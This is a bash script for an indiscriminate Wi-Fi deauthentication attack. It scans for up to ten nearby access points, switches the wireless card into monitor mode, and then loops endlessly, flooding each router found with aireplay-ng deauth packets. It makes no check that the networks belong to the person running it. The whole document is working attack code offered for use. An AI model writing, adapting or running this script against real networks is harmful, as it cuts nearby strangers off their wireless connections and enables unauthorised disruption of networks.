#!/bin/bash

# Fixed Fast Multi Deauth Attack Script (No file saves)

interface="wlan0"
mon_interface="${interface}mon"

cleanup() {
    echo "[*] Cleaning up..."
    sudo airmon-ng stop $mon_interface > /dev/null 2>&1
    sudo systemctl start NetworkManager
    exit
}

trap cleanup INT

echo "[*] Scanning routers BEFORE enabling monitor mode..."
scan_results=$(nmcli -t -f BSSID,CHAN dev wifi list | grep -E "^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" | head -n 10)
IFS=$'\n' read -rd '' -a lines <<<"$scan_results"

if [ ${#lines[@]} -eq 0 ]; then
    echo "[!] No routers found. Exiting."
    exit 1
fi

echo "[*] Found ${#lines[@]} target(s). Enabling monitor mode..."
sudo airmon-ng start $interface > /dev/null 2>&1

echo "[*] Starting deauth attack..."
while true; do
    for line in "${lines[@]}"; do
        bssid=$(echo "$line" | cut -d: -f1-6)
        channel=$(echo "$line" | cut -d: -f7)
        [ -z "$bssid" ] && continue
        [ -z "$channel" ] && continue

        sudo iwconfig $mon_interface channel $channel
        echo "[*] Deauthing $bssid on channel $channel..."
        sudo aireplay-ng --deauth 0 -a $bssid $mon_interface > /dev/null 2>&1 &
        sleep 3
        sudo pkill aireplay-ng
    done
done
